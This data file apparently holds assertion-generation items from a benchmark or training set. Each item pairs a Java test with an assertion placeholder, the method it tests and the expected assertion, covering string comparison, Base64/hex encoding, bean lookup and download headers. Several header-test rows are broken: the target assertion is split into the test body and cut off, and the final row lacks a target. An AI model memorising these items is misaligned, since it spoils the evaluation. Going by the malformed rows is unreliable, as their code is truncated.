"testConsistentWithEquals() { String[] s1 = new String[]{"""", new String(""""), ""test"", new String(""test"")}; String[] s2 = new String[]{"""", new String(""""), ""test"", new String(""test"")};  for (int i = 0; i < s1.length; i++) { ""<AssertPlaceHolder>""; } }
compare(String s1, String s2) { if (s1 == null && s2 == null) { return 0; } if (s1 == null) { return -1; } if (s2 == null) { return 1; } Matcher m1 = NUM_OR_TEXT_PATTERN.matcher(s1); Matcher m2 = NUM_OR_TEXT_PATTERN.matcher(s2); boolean found1 = m1.find(); boolean found2 = m2.find(); int result; while (found1 && found2) { String n1 = m1.group(1); String n2 = m2.group(1); if (n1 != null && n2 != null) { if (n1.length() <= 18 && n2.length() <= 18) { result = compareAsLongs(Long.parseLong(n1), Long.parseLong(n2)); } else { result = compareAsBigIntegers(new BigInteger(n1), new BigInteger(n2)); } } else { result = compareAsStrings(m1.group(2), m2.group(2)); } if (result != 0) { return result; } found1 = m1.find(); found2 = m2.find(); } return compareFound(found1, found2); }"	"assertTrue(""Comparison method violates its general contract"", (StringUtility.ALPHANUMERIC_COMPARATOR.compare(s1[i], s2[i]) == 0) == s1[i].equals(s2[i]))"
"testBothNull() { String s1 = null; String s2 = null; ""<AssertPlaceHolder>""; }
compare(String s1, String s2) { if (s1 == null && s2 == null) { return 0; } if (s1 == null) { return -1; } if (s2 == null) { return 1; } Matcher m1 = NUM_OR_TEXT_PATTERN.matcher(s1); Matcher m2 = NUM_OR_TEXT_PATTERN.matcher(s2); boolean found1 = m1.find(); boolean found2 = m2.find(); int result; while (found1 && found2) { String n1 = m1.group(1); String n2 = m2.group(1); if (n1 != null && n2 != null) { if (n1.length() <= 18 && n2.length() <= 18) { result = compareAsLongs(Long.parseLong(n1), Long.parseLong(n2)); } else { result = compareAsBigIntegers(new BigInteger(n1), new BigInteger(n2)); } } else { result = compareAsStrings(m1.group(2), m2.group(2)); } if (result != 0) { return result; } found1 = m1.find(); found2 = m2.find(); } return compareFound(found1, found2); }"	"assertEquals(""Both arguments are 'null'"", 0, StringUtility.ALPHANUMERIC_COMPARATOR.compare(s1, s2))"
"testFirstNull() { String s1 = null; String s2 = """"; ""<AssertPlaceHolder>""; }
compare(String s1, String s2) { if (s1 == null && s2 == null) { return 0; } if (s1 == null) { return -1; } if (s2 == null) { return 1; } Matcher m1 = NUM_OR_TEXT_PATTERN.matcher(s1); Matcher m2 = NUM_OR_TEXT_PATTERN.matcher(s2); boolean found1 = m1.find(); boolean found2 = m2.find(); int result; while (found1 && found2) { String n1 = m1.group(1); String n2 = m2.group(1); if (n1 != null && n2 != null) { if (n1.length() <= 18 && n2.length() <= 18) { result = compareAsLongs(Long.parseLong(n1), Long.parseLong(n2)); } else { result = compareAsBigIntegers(new BigInteger(n1), new BigInteger(n2)); } } else { result = compareAsStrings(m1.group(2), m2.group(2)); } if (result != 0) { return result; } found1 = m1.find(); found2 = m2.find(); } return compareFound(found1, found2); }"	"assertTrue(""First argument is 'null'"", StringUtility.ALPHANUMERIC_COMPARATOR.compare(s1, s2) < 0)"
"testSecondNull() { String s1 = """"; String s2 = null; ""<AssertPlaceHolder>""; }
compare(String s1, String s2) { if (s1 == null && s2 == null) { return 0; } if (s1 == null) { return -1; } if (s2 == null) { return 1; } Matcher m1 = NUM_OR_TEXT_PATTERN.matcher(s1); Matcher m2 = NUM_OR_TEXT_PATTERN.matcher(s2); boolean found1 = m1.find(); boolean found2 = m2.find(); int result; while (found1 && found2) { String n1 = m1.group(1); String n2 = m2.group(1); if (n1 != null && n2 != null) { if (n1.length() <= 18 && n2.length() <= 18) { result = compareAsLongs(Long.parseLong(n1), Long.parseLong(n2)); } else { result = compareAsBigIntegers(new BigInteger(n1), new BigInteger(n2)); } } else { result = compareAsStrings(m1.group(2), m2.group(2)); } if (result != 0) { return result; } found1 = m1.find(); found2 = m2.find(); } return compareFound(found1, found2); }"	"assertTrue(""Second argument is 'null'"", StringUtility.ALPHANUMERIC_COMPARATOR.compare(s1, s2) > 0)"
"testCompare() { String s1 = ""doc8""; String s2 = ""doc9.txt""; ""<AssertPlaceHolder>""; }
compare(String s1, String s2) { if (s1 == null && s2 == null) { return 0; } if (s1 == null) { return -1; } if (s2 == null) { return 1; } Matcher m1 = NUM_OR_TEXT_PATTERN.matcher(s1); Matcher m2 = NUM_OR_TEXT_PATTERN.matcher(s2); boolean found1 = m1.find(); boolean found2 = m2.find(); int result; while (found1 && found2) { String n1 = m1.group(1); String n2 = m2.group(1); if (n1 != null && n2 != null) { if (n1.length() <= 18 && n2.length() <= 18) { result = compareAsLongs(Long.parseLong(n1), Long.parseLong(n2)); } else { result = compareAsBigIntegers(new BigInteger(n1), new BigInteger(n2)); } } else { result = compareAsStrings(m1.group(2), m2.group(2)); } if (result != 0) { return result; } found1 = m1.find(); found2 = m2.find(); } return compareFound(found1, found2); }"	"assertTrue(""'doc8' < 'doc9.txt'"", StringUtility.ALPHANUMERIC_COMPARATOR.compare(s1, s2) < 0)"
"testCompareFoundBoth() { String s1 = ""doc9.doc""; String s2 = ""doc9.txt""; ""<AssertPlaceHolder>""; }
compare(String s1, String s2) { if (s1 == null && s2 == null) { return 0; } if (s1 == null) { return -1; } if (s2 == null) { return 1; } Matcher m1 = NUM_OR_TEXT_PATTERN.matcher(s1); Matcher m2 = NUM_OR_TEXT_PATTERN.matcher(s2); boolean found1 = m1.find(); boolean found2 = m2.find(); int result; while (found1 && found2) { String n1 = m1.group(1); String n2 = m2.group(1); if (n1 != null && n2 != null) { if (n1.length() <= 18 && n2.length() <= 18) { result = compareAsLongs(Long.parseLong(n1), Long.parseLong(n2)); } else { result = compareAsBigIntegers(new BigInteger(n1), new BigInteger(n2)); } } else { result = compareAsStrings(m1.group(2), m2.group(2)); } if (result != 0) { return result; } found1 = m1.find(); found2 = m2.find(); } return compareFound(found1, found2); }"	"assertTrue(""'doc9.doc' < 'doc9.txt'"", StringUtility.ALPHANUMERIC_COMPARATOR.compare(s1, s2) < 0)"
"testCompareFoundSecondLower() { String s1 = ""doc10""; String s2 = ""doc9.txt""; ""<AssertPlaceHolder>""; }
compare(String s1, String s2) { if (s1 == null && s2 == null) { return 0; } if (s1 == null) { return -1; } if (s2 == null) { return 1; } Matcher m1 = NUM_OR_TEXT_PATTERN.matcher(s1); Matcher m2 = NUM_OR_TEXT_PATTERN.matcher(s2); boolean found1 = m1.find(); boolean found2 = m2.find(); int result; while (found1 && found2) { String n1 = m1.group(1); String n2 = m2.group(1); if (n1 != null && n2 != null) { if (n1.length() <= 18 && n2.length() <= 18) { result = compareAsLongs(Long.parseLong(n1), Long.parseLong(n2)); } else { result = compareAsBigIntegers(new BigInteger(n1), new BigInteger(n2)); } } else { result = compareAsStrings(m1.group(2), m2.group(2)); } if (result != 0) { return result; } found1 = m1.find(); found2 = m2.find(); } return compareFound(found1, found2); }"	"assertTrue(""'doc10' > 'doc9.txt'"", StringUtility.ALPHANUMERIC_COMPARATOR.compare(s1, s2) > 0)"
"testCompareFoundSecondGreater() { String s1 = ""doc9""; String s2 = ""doc9.txt""; ""<AssertPlaceHolder>""; }
compare(String s1, String s2) { if (s1 == null && s2 == null) { return 0; } if (s1 == null) { return -1; } if (s2 == null) { return 1; } Matcher m1 = NUM_OR_TEXT_PATTERN.matcher(s1); Matcher m2 = NUM_OR_TEXT_PATTERN.matcher(s2); boolean found1 = m1.find(); boolean found2 = m2.find(); int result; while (found1 && found2) { String n1 = m1.group(1); String n2 = m2.group(1); if (n1 != null && n2 != null) { if (n1.length() <= 18 && n2.length() <= 18) { result = compareAsLongs(Long.parseLong(n1), Long.parseLong(n2)); } else { result = compareAsBigIntegers(new BigInteger(n1), new BigInteger(n2)); } } else { result = compareAsStrings(m1.group(2), m2.group(2)); } if (result != 0) { return result; } found1 = m1.find(); found2 = m2.find(); } return compareFound(found1, found2); }"	"assertTrue(""'doc9' < 'doc9.txt'"", StringUtility.ALPHANUMERIC_COMPARATOR.compare(s1, s2) < 0)"
"testCompareNumeric() { String s1 = ""doc9.txt""; String s2 = ""doc10.txt""; ""<AssertPlaceHolder>""; }
compare(String s1, String s2) { if (s1 == null && s2 == null) { return 0; } if (s1 == null) { return -1; } if (s2 == null) { return 1; } Matcher m1 = NUM_OR_TEXT_PATTERN.matcher(s1); Matcher m2 = NUM_OR_TEXT_PATTERN.matcher(s2); boolean found1 = m1.find(); boolean found2 = m2.find(); int result; while (found1 && found2) { String n1 = m1.group(1); String n2 = m2.group(1); if (n1 != null && n2 != null) { if (n1.length() <= 18 && n2.length() <= 18) { result = compareAsLongs(Long.parseLong(n1), Long.parseLong(n2)); } else { result = compareAsBigIntegers(new BigInteger(n1), new BigInteger(n2)); } } else { result = compareAsStrings(m1.group(2), m2.group(2)); } if (result != 0) { return result; } found1 = m1.find(); found2 = m2.find(); } return compareFound(found1, found2); }"	"assertTrue(""'doc9.txt' < 'doc10.txt'"", StringUtility.ALPHANUMERIC_COMPARATOR.compare(s1, s2) < 0)"
"testCompareText() { String s1 = ""doc9.txt""; String s2 = ""myfile.txt""; ""<AssertPlaceHolder>""; }
compare(String s1, String s2) { if (s1 == null && s2 == null) { return 0; } if (s1 == null) { return -1; } if (s2 == null) { return 1; } Matcher m1 = NUM_OR_TEXT_PATTERN.matcher(s1); Matcher m2 = NUM_OR_TEXT_PATTERN.matcher(s2); boolean found1 = m1.find(); boolean found2 = m2.find(); int result; while (found1 && found2) { String n1 = m1.group(1); String n2 = m2.group(1); if (n1 != null && n2 != null) { if (n1.length() <= 18 && n2.length() <= 18) { result = compareAsLongs(Long.parseLong(n1), Long.parseLong(n2)); } else { result = compareAsBigIntegers(new BigInteger(n1), new BigInteger(n2)); } } else { result = compareAsStrings(m1.group(2), m2.group(2)); } if (result != 0) { return result; } found1 = m1.find(); found2 = m2.find(); } return compareFound(found1, found2); }"	"assertTrue(""'doc9.txt' < 'myfile.txt'"", StringUtility.ALPHANUMERIC_COMPARATOR.compare(s1, s2) < 0)"
"testNotNull_Negative() { Assertions.""<AssertPlaceHolder>""; }
assertNotNull(final T value) { return assertNotNull(value, ""expected 'non-null' object but was 'null'""); }"	assertNotNull(null)
"testTrue_Negative() { Assertions.""<AssertPlaceHolder>""; }
assertTrue(final boolean value) { return assertTrue(value, ""expected 'true' but was 'false'.""); }"	assertTrue(false)
"testFalse_Negative() { Assertions.""<AssertPlaceHolder>""; }
assertFalse(final boolean value) { return assertFalse(value, ""expected 'false' but was 'true'.""); }"	assertFalse(true)
"testNull_negative() { Assertions.""<AssertPlaceHolder>""; }
assertNull(final T value) { return assertNull(value, ""expected 'null' object but was 'non-null'""); }"	assertNull(new Object())
"testEquals2() { Assertions.""<AssertPlaceHolder>""; }
assertEquals(final T value1, final Object value2) { return assertEquals(value1, value2, ""expected value1 to be equals with value2 [value1={}, value2={}]"", value1, value2); }"	"assertEquals(""value"", ""something other"")"
"testSame2() { Assertions.""<AssertPlaceHolder>""; }
assertSame(final T value1, final Object value2) { return assertSame(value1, value2, ""expected value1 to be equals with value2 [value1={}, value2={}]"", value1, value2); }"	assertSame(new Object(), new Object())
"testNotSame1() { Object object = new Object(); Assertions.""<AssertPlaceHolder>""; }
assertNotSame(final T value1, final Object value2) { return assertNotSame(value1, value2, ""expected value1 to be equals with value2 [value1={}, value2={}]"", value1, value2); }"	assertNotSame(object, object)
"testEncodeDecodeMultipleByteLength() { for (int i = 0; i < 1000; i++) { byte[] byteArray = new byte[i]; for (int j = 0; j < i; j++) { byteArray[j] = (byte) ((byte) i & 0xff); } TuningUtility.startTimer(); String encode = Base64Utility.encode(byteArray); TuningUtility.stopTimer(""encode"", false, true); TuningUtility.startTimer(); byte[] decode = Base64Utility.decode(encode); TuningUtility.stopTimer(""decode"", false, true); ""<AssertPlaceHolder>""; } TuningUtility.finishAll(); }
decode(String string) { return decode(string, false); }"	assertArrayEquals(byteArray, decode)
"encodeDecodeTestShort() { String encode = Base64Utility.encode(TEST_STRING_SHORT.getBytes()); byte[] decode = Base64Utility.decode(encode); ""<AssertPlaceHolder>""; }
decode(String string) { return decode(string, false); }"	assertArrayEquals(TEST_STRING_SHORT.getBytes(), decode)
"encodeDecodeUrlSafeTestShort() { String encode = Base64Utility.encodeUrlSafe(TEST_STRING_SHORT.getBytes()); byte[] decode = Base64Utility.decodeUrlSafe(encode); ""<AssertPlaceHolder>""; }
decodeUrlSafe(String string) { return decode(string, true); }"	assertArrayEquals(TEST_STRING_SHORT.getBytes(), decode)
"encodeDecodeTestMiddle() { String encode = Base64Utility.encode(TEST_STRING_MIDDLE.getBytes()); byte[] decode = Base64Utility.decode(encode); ""<AssertPlaceHolder>""; }
decode(String string) { return decode(string, false); }"	assertArrayEquals(TEST_STRING_MIDDLE.getBytes(), decode)
"encodeDecodeUrlSafeTestMiddle() { String encode = Base64Utility.encodeUrlSafe(TEST_STRING_MIDDLE.getBytes()); byte[] decode = Base64Utility.decodeUrlSafe(encode); ""<AssertPlaceHolder>""; }
decodeUrlSafe(String string) { return decode(string, true); }"	assertArrayEquals(TEST_STRING_MIDDLE.getBytes(), decode)
"encodeDecodeTestLong() { String encode = Base64Utility.encode(TEST_STRING_LONG.getBytes()); byte[] decode = Base64Utility.decode(encode); ""<AssertPlaceHolder>""; }
decode(String string) { return decode(string, false); }"	assertArrayEquals(TEST_STRING_LONG.getBytes(), decode)
"encodeDecodeUrlSafeTestLong() { String encode = Base64Utility.encodeUrlSafe(TEST_STRING_LONG.getBytes()); byte[] decode = Base64Utility.decodeUrlSafe(encode); ""<AssertPlaceHolder>""; }
decodeUrlSafe(String string) { return decode(string, true); }"	assertArrayEquals(TEST_STRING_LONG.getBytes(), decode)
"encodeDecodeTestLongAndStringChangedToBlocks() { String encode = Base64Utility.encode(TEST_STRING_LONG.getBytes()); encode = StringUtility.wrapText(encode, 80); byte[] decode = Base64Utility.decode(encode); ""<AssertPlaceHolder>""; }
decode(String string) { return decode(string, false); }"	assertArrayEquals(TEST_STRING_LONG.getBytes(), decode)
"encodeTestShortAndCheckAgainstBase64String() { String encode = Base64Utility.encode(TEST_STRING_SHORT.getBytes()); ""<AssertPlaceHolder>""; }
encode(byte[] bytes) { return encode(bytes, false); }"	assertEquals(TEST_BASE64_DATA_OF_STRING_SHORT, encode)
"encodeTestMiddleAndCheckAgainstBase64String() { String encode = Base64Utility.encode(TEST_STRING_MIDDLE.getBytes()); ""<AssertPlaceHolder>""; }
encode(byte[] bytes) { return encode(bytes, false); }"	assertEquals(TEST_BASE64_DATA_OF_STRING_MIDDLE, encode)
"encodeTestUrlUnsafeAndCheckAgainstBase64String() { String encode = Base64Utility.encode(TEST_STRING_URL.getBytes()); ""<AssertPlaceHolder>""; }
encode(byte[] bytes) { return encode(bytes, false); }"	assertEquals(TEST_BASE64_DATA_OF_STRING_URL_UNSAFE, encode)
"encodeTestUrlSafeAndCheckAgainstBase64String() { String encode = Base64Utility.encodeUrlSafe(TEST_STRING_URL.getBytes()); ""<AssertPlaceHolder>""; }
encodeUrlSafe(byte[] bytes) { return encode(bytes, true); }"	assertEquals(TEST_BASE64_DATA_OF_STRING_URL_SAFE, encode)
"encodeTestLongAndCheckAgainstBase64String() { String encode = Base64Utility.encode(TEST_STRING_LONG.getBytes()); ""<AssertPlaceHolder>""; }
encode(byte[] bytes) { return encode(bytes, false); }"	assertEquals(TEST_BASE64_DATA_STRING_OF_STRING_LONG, encode)
"encodeTestLongAndStringChangedToBlocks() { String encode = Base64Utility.encode(TEST_STRING_LONG.getBytes()); encode = StringUtility.wrapText(encode, 76); ""<AssertPlaceHolder>""; }
encode(byte[] bytes) { return encode(bytes, false); }"	assertEquals(TEST_BASE64_DATA_BLOCK_OF_STRING_LONG, encode)
"decodeTestShortBase64String() { byte[] decode = Base64Utility.decode(TEST_BASE64_DATA_OF_STRING_SHORT); ""<AssertPlaceHolder>""; }
decode(String string) { return decode(string, false); }"	assertArrayEquals(TEST_STRING_SHORT.getBytes(), decode)
"decodeTestMiddleBase64String() { byte[] decode = Base64Utility.decode(TEST_BASE64_DATA_OF_STRING_MIDDLE); ""<AssertPlaceHolder>""; }
decode(String string) { return decode(string, false); }"	assertArrayEquals(TEST_STRING_MIDDLE.getBytes(), decode)
"decodeTestLongBase64String() { byte[] decode = Base64Utility.decode(TEST_BASE64_DATA_STRING_OF_STRING_LONG); ""<AssertPlaceHolder>""; }
decode(String string) { return decode(string, false); }"	assertArrayEquals(TEST_STRING_LONG.getBytes(), decode)
"decodeTestLongBlockBase64String() { byte[] decode = Base64Utility.decode(TEST_BASE64_DATA_BLOCK_OF_STRING_LONG); ""<AssertPlaceHolder>""; }
decode(String string) { return decode(string, false); }"	assertArrayEquals(TEST_STRING_LONG.getBytes(), decode)
"decodeTestUrlSafe() { byte[] decoded = Base64Utility.decodeUrlSafe(TEST_BASE64_DATA_OF_STRING_URL_SAFE); ""<AssertPlaceHolder>""; }
decodeUrlSafe(String string) { return decode(string, true); }"	assertEquals(TEST_STRING_URL, new String(decoded, StandardCharsets.UTF_8))
"Exception { ""<AssertPlaceHolder>""; }
findConstructor(Class<T> c, Class<?>... parameterTypes) { if (c == null) { return null; }  final Constructor<?>[] publicConstructors = c.getConstructors(); switch (publicConstructors.length) { case 0: return null; case 1: return checkParameterTypesAndCast(publicConstructors[0], parameterTypes); }  final List<Constructor<T>> candidates = Stream.of(publicConstructors) .map(ctor -> BeanUtility.<T> checkParameterTypesAndCast(ctor, parameterTypes)) .filter(Objects::nonNull) .collect(Collectors.toList());  if (candidates.size() <= 1) { return CollectionUtility.firstElement(candidates); }  // find best matching constructor using type distance NavigableMap<Integer, Set<Constructor<T>>> weightedCandidates = new TreeMap<>(); for (Constructor<T> ctor : candidates) { int distance = 0; // compute parameter type distances // Note: constructor parameter count matches requested parameter count //       and constructor parameter types are assignable from requested parameter types //       both filters are already applied by checkParameterTypesAndCast Class<?>[] ctorParameters = ctor.getParameterTypes(); for (int i = 0; i < parameterTypes.length; i++) { int currentParamDistance = computeTypeDistance(ctorParameters[i], parameterTypes[i]); distance += currentParamDistance; } weightedCandidates.computeIfAbsent(distance, k -> new HashSet<>()).add(ctor); }  // check ambiguity // Note: there is always at least one entry in weightedCandidates Set<Constructor<T>> bestMatchingConstructors = weightedCandidates.firstEntry().getValue(); if (bestMatchingConstructors.size() <= 1) { return CollectionUtility.firstElement(bestMatchingConstructors); }  throw new ProcessingException(""More than one constructors found due to ambiguous parameter types [class="" + c + "", parameterTypes="" + Arrays.toString(parameterTypes) + ""]""); }"	assertEquals(ArrayConstructor.class.getConstructor(String[].class), BeanUtility.findConstructor(ArrayConstructor.class, String[].class))
"testCreateInstanceNonStaticClassWithThisArgument() { ""<AssertPlaceHolder>""; }
createInstance(Class<T> c, Object... parameters) { if (parameters == null || parameters.length == 0) { return createInstance(c, null, null); } Class<?>[] parameterTypes = new Class<?>[parameters.length]; for (int i = 0; i < parameters.length; i++) { if (parameters[i] != null) { parameterTypes[i] = parameters[i].getClass(); } } return createInstance(c, parameterTypes, parameters); }"	assertNotNull(BeanUtility.createInstance(NonStaticInnerClass.class, this))
"IOException { final byte[] data = m_testString.getBytes(m_charset); try (BomInputStreamReader in = new BomInputStreamReader(new ByteArrayInputStream(data), m_charset)) { for (int i = 0; i < m_expectedString.length(); i++) { ""<AssertPlaceHolder>""; } } }
read() throws IOException { int ch = super.read(); if (m_firstChar) { // check if first char is the BOM m_firstChar = false; if (ch == BOM_CHAR && SUPPORTED_UNICODE_CHARSETS.contains(getEncoding())) { // first char is the BOM -> read and return next char ch = super.read(); } } return ch; }"	"assertEquals(String.format(""char at position %d does not match"", i), m_expectedString.charAt(i), in.read())"
"testNull() { ""<AssertPlaceHolder>""; }
nvl(Boolean b) { return nvl(b, false); }"	assertFalse(BooleanUtility.nvl(null))
"testTrue() { ""<AssertPlaceHolder>""; }
nvl(Boolean b) { return nvl(b, false); }"	assertEquals(BooleanUtility.nvl(Boolean.TRUE), true)
"testFalse() { ""<AssertPlaceHolder>""; }
nvl(Boolean b) { return nvl(b, false); }"	assertEquals(BooleanUtility.nvl(Boolean.FALSE), false)
"testDefaultValue() { ""<AssertPlaceHolder>""; }
nvl(Boolean b, boolean defaultValue) { if (b == null) { return defaultValue; } return b.booleanValue(); }"	assertEquals(BooleanUtility.nvl(null, true), true)
"testAbstractClass() { ClassIdentifier cid = new ClassIdentifier(AbstractTemplate.class); ""<AssertPlaceHolder>""; }
getClasses() { return Arrays.copyOf(m_segments, m_segments.length); }"	assertArrayEquals(new Class[]{AbstractTemplate.class}, cid.getClasses())
"testIsEmptyExpires() { ""<AssertPlaceHolder>""; }
isEmpty() { return !newEntryIterator(false).hasNext(); }"	assertTrue(createMap(true).isEmpty())
"testIsEmptyNotExpires() { ""<AssertPlaceHolder>""; }
isEmpty() { return !newEntryIterator(false).hasNext(); }"	assertFalse(createMap(false).isEmpty())
"testIterateEntriesExpires() { ""<AssertPlaceHolder>""; }
hasNext() { return m_nextEntry != null; }"	assertFalse(createMap(true).entrySet().iterator().hasNext())
"testIterateEntriesNotExpires() { ""<AssertPlaceHolder>""; }
getValue() { return m_value; }"	"assertEquals(""1"", createMap(false).entrySet().iterator().next().getValue())"
"testFilterClassIgnoringInjectFieldAnnotationExpectingNullValue() { Class<Replacement> filteredValue = ConfigurationUtility.filterClassIgnoringInjectFieldAnnotation(new Class[]{Replacement.class}, Replacement.class); ""<AssertPlaceHolder>""; }
filterClassIgnoringInjectFieldAnnotation(Class[] classes, Class<T> filter) { for (Class c : classes) { if (filter.isAssignableFrom(c) && !Modifier.isAbstract(c.getModifiers()) && !isInjectFieldAnnotationPresent(c)) { return c; } } return null; }"	assertNull(filteredValue)
"testFilterClassIgnoringInjectFieldAnnotationExpectingMatch() { Class<Original> filteredValue = ConfigurationUtility.filterClassIgnoringInjectFieldAnnotation(new Class[]{Original.class}, Original.class); ""<AssertPlaceHolder>""; }
filterClassIgnoringInjectFieldAnnotation(Class[] classes, Class<T> filter) { for (Class c : classes) { if (filter.isAssignableFrom(c) && !Modifier.isAbstract(c.getModifiers()) && !isInjectFieldAnnotationPresent(c)) { return c; } } return null; }"	assertEquals(Original.class, filteredValue)
"testIsConnectionError() { ConnectionErrorDetector connectionErrorDetector = BEANS.get(ConnectionErrorDetector.class); ""<AssertPlaceHolder>""; }
isConnectionError(Throwable e) { return BEANS.get(DefaultExceptionTranslator.class).throwableCausesAccept(e, t -> isConnectionErrorThrowable(t) && isConnectionErrorMessage(t)); }"	assertEquals(m_testParameter.isDetectable(), connectionErrorDetector.isConnectionError(m_testParameter.getException()))
"testContentDispositionResponseHeader() { Map<String, String> actual = new DownloadResponseHelper().getDownloadHeaders(""simple.pdf""); ""<AssertPlaceHolder>""; filename="""" + ""simple.pdf"" + """"; filename*=utf-8''"" + ""simple.pdf"" + """"))); }
getDownloadHeaders(String filename) { Map<String, String> downloadHeaders = new HashMap<>(); downloadHeaders.put(HEADER_CONTENT_DISPOSITION, getContentDispositionHeaderValue(filename)); downloadHeaders.put(HEADER_X_CONTENT_TYPE_OPTIONS, getContentTypeOptionsHeaderValue()); return downloadHeaders; }"	"assertThat(actual, is(getExpectedHeaders(""attachment"
"testContentDispositionResponseHeaderNullFillsDefaultValue() { Map<String, String> actual = new DownloadResponseHelper().getDownloadHeaders(null); ""<AssertPlaceHolder>""; filename="""" + ""Download"" + """"; filename*=utf-8''"" + ""Download"" + """"))); }
getDownloadHeaders(String filename) { Map<String, String> downloadHeaders = new HashMap<>(); downloadHeaders.put(HEADER_CONTENT_DISPOSITION, getContentDispositionHeaderValue(filename)); downloadHeaders.put(HEADER_X_CONTENT_TYPE_OPTIONS, getContentTypeOptionsHeaderValue()); return downloadHeaders; }"	"assertThat(actual, is(getExpectedHeaders(""attachment"
"testContentDispositionResponseHeaderEmptyFillsDefaultValue() { Map<String, String> actual = new DownloadResponseHelper().getDownloadHeaders(""""); ""<AssertPlaceHolder>""; filename="""" + ""Download"" + """"; filename*=utf-8''"" + ""Download"" + """"))); }
getDownloadHeaders(String filename) { Map<String, String> downloadHeaders = new HashMap<>(); downloadHeaders.put(HEADER_CONTENT_DISPOSITION, getContentDispositionHeaderValue(filename)); downloadHeaders.put(HEADER_X_CONTENT_TYPE_OPTIONS, getContentTypeOptionsHeaderValue()); return downloadHeaders; }"	"assertThat(actual, is(getExpectedHeaders(""attachment"
"testContentDispositionResponseHeaderContainsOnlyNonQuotesFillsDefaultValue() { Map<String, String> actual = new DownloadResponseHelper().getDownloadHeaders(""""""); ""<AssertPlaceHolder>""; filename="""" + ""Download"" + """"; filename*=utf-8''"" + ""%22"" + """"))); }
getDownloadHeaders(String filename) { Map<String, String> downloadHeaders = new HashMap<>(); downloadHeaders.put(HEADER_CONTENT_DISPOSITION, getContentDispositionHeaderValue(filename)); downloadHeaders.put(HEADER_X_CONTENT_TYPE_OPTIONS, getContentTypeOptionsHeaderValue()); return downloadHeaders; }"	"assertThat(actual, is(getExpectedHeaders(""attachment"
"testContentDispositionResponseHeaderDoubleQuotes() { Map<String, String> actual = new DownloadResponseHelper().getDownloadHeaders(""x""x""); ""<AssertPlaceHolder>""; filename="""" + ""xx"" + """"; filename*=utf-8''"" + ""x%22x"" + """"))); }
getDownloadHeaders(String filename) { Map<String, String> downloadHeaders = new HashMap<>(); downloadHeaders.put(HEADER_CONTENT_DISPOSITION, getContentDispositionHeaderValue(filename)); downloadHeaders.put(HEADER_X_CONTENT_TYPE_OPTIONS, getContentTypeOptionsHeaderValue()); return downloadHeaders; }"	"assertThat(actual, is(getExpectedHeaders(""attachment"
"testContentDispositionResponseHeaderNewlinesTabsSpaces() { Map<String, String> actual = new DownloadResponseHelper().getDownloadHeaders(""x\r\f\n\tx\b x""); ""<AssertPlaceHolder>""; filename="""" + ""xx x"" + """"; filename*=utf-8''"" + ""xx%20x"" + """"))); }
getDownloadHeaders(String filename) { Map<String, String> downloadHeaders = new HashMap<>(); downloadHeaders.put(HEADER_CONTENT_DISPOSITION, getContentDispositionHeaderValue(filename)); downloadHeaders.put(HEADER_X_CONTENT_TYPE_OPTIONS, getContentTypeOptionsHeaderValue()); return downloadHeaders; }"	"assertThat(actual, is(getExpectedHeaders(""attachment"
"testContentDispositionResponseHeaderUrlEncodeTrimsWhitespace() { Map<String, String> actual = new DownloadResponseHelper().getDownloadHeaders(""   x   ""); ""<AssertPlaceHolder>""; filename="""" + ""   x   "" + """"; filename*=utf-8''"" + ""x"" + """"))); }
getDownloadHeaders(String filename) { Map<String, String> downloadHeaders = new HashMap<>(); downloadHeaders.put(HEADER_CONTENT_DISPOSITION, getContentDispositionHeaderValue(filename)); downloadHeaders.put(HEADER_X_CONTENT_TYPE_OPTIONS, getContentTypeOptionsHeaderValue()); return downloadHeaders; }"	"assertThat(actual, is(getExpectedHeaders(""attachment"
"testContentDispositionResponseHeaderUrlEncodeTrimsWhitespace2() { Map<String, String> actual = new DownloadResponseHelper().getDownloadHeaders("" ""); ""<AssertPlaceHolder>""; filename="""" + "" "" + """"; filename*=utf-8''"" + """" + """"))); }
getDownloadHeaders(String filename) { Map<String, String> downloadHeaders = new HashMap<>(); downloadHeaders.put(HEADER_CONTENT_DISPOSITION, getContentDispositionHeaderValue(filename)); downloadHeaders.put(HEADER_X_CONTENT_TYPE_OPTIONS, getContentTypeOptionsHeaderValue()); return downloadHeaders; }"	"assertThat(actual, is(getExpectedHeaders(""attachment"
"testContentDispositionResponseHeaderEuroSignIsRemovedInIso88591() { Map<String, String> actual = new DownloadResponseHelper().getDownloadHeaders(""Test 5€.pdf""); ""<AssertPlaceHolder>""; filename="""" + ""Test 5.pdf"" + """"; filename*=utf-8''"" + ""Test%205%E2%82%AC.pdf"" + """"))); }
getDownloadHeaders(String filename) { Map<String, String> downloadHeaders = new HashMap<>(); downloadHeaders.put(HEADER_CONTENT_DISPOSITION, getContentDispositionHeaderValue(filename)); downloadHeaders.put(HEADER_X_CONTENT_TYPE_OPTIONS, getContentTypeOptionsHeaderValue()); return downloadHeaders; }"	"assertThat(actual, is(getExpectedHeaders(""attachment"
"testRemove() { EventListenerList listenerList = new EventListenerList(); EventListener listener = new EventListener() { }; listenerList.add(EventListener.class, listener); listenerList.add(EventListener.class, listener); listenerList.remove(EventListener.class, listener); Assert.""<AssertPlaceHolder>""; }
getListenerCount(Class<T> t) { synchronized (m_listenerListLock) { return getListenerCountNoLock(t); } }"	assertEquals(1, listenerList.getListenerCount(EventListener.class))
"testRemoveAll() { EventListenerList listenerList = new EventListenerList(); EventListener listener = new EventListener() { }; listenerList.add(EventListener.class, listener); listenerList.add(EventListener.class, listener); listenerList.removeAll(EventListener.class, listener); Assert.""<AssertPlaceHolder>""; }
getListenerCount(Class<T> t) { synchronized (m_listenerListLock) { return getListenerCountNoLock(t); } }"	assertEquals(0, listenerList.getListenerCount(EventListener.class))
"testAdd() { EventListenerList listenerList = new EventListenerList(); EventListener listener = new EventListener() { }; listenerList.add(EventListener.class, listener); listenerList.add(EventListener.class, listener); Assert.""<AssertPlaceHolder>""; }
getListenerCount(Class<T> t) { synchronized (m_listenerListLock) { return getListenerCountNoLock(t); } }"	assertEquals(2, listenerList.getListenerCount(EventListener.class))
"testEncodeDecodeMultipleByteLength() { for (int i = 0; i < 1000; i++) { byte[] byteArray = new byte[i]; for (int j = 0; j < i; j++) { byteArray[j] = (byte) ((byte) i & 0xff); } TuningUtility.startTimer(); String encode = HexUtility.encode(byteArray); TuningUtility.stopTimer(""encode"", false, true); TuningUtility.startTimer(); byte[] decode = HexUtility.decode(encode); TuningUtility.stopTimer(""decode"", false, true); ""<AssertPlaceHolder>""; } TuningUtility.finishAll(); }
